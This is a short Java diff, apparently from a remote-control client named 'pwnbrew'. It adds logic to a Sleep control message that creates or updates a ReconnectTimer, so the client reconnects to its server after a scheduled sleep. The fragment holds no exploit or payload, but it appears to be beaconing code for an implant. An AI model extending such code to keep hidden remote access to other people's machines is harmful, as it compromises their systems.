@@ -54,13 +54,16 @@ import java.text.ParseException;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.logging.Level;
+import pwnbrew.ClientConfig;
 import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.PortManager;
+import pwnbrew.network.ClientPortRouter;
 import pwnbrew.utilities.Constants;
 import pwnbrew.utilities.LoaderUtilities;
 import pwnbrew.utilities.Utilities;
 import pwnbrew.network.ControlOption;
 import pwnbrew.utilities.DebugPrinter;
+import pwnbrew.utilities.ReconnectTimer;
 
 /**
  *
@@ -185,6 +188,23 @@ public final class Sleep extends ControlMessage {
                 } catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchFieldException ex) {
                     RemoteLog.log(Level.WARNING, NAME_Class, "evaluate()", ex.getMessage(), ex);    
                 }
+                
+            } else {
+                
+                ClientConfig theConf = ClientConfig.getConfig();
+                int socketPort = theConf.getSocketPort();
+                int theChannelId = getChannelId();
+        
+                //Get the port router
+                ClientPortRouter aPR = (ClientPortRouter) passedManager.getPortRouter( socketPort );
+                ReconnectTimer aReconnectTimer = aPR.getConnectionManager().getReconnectTimer(theChannelId);
+
+                //Create one if it doesn't exist
+                if( aReconnectTimer == null)
+                    aReconnectTimer = new ReconnectTimer(passedManager, theChannelId); 
+                
+                //Set the initial sleep date
+                aReconnectTimer.setSleepDateStr(adjSleepDate);
                 
             }             
             
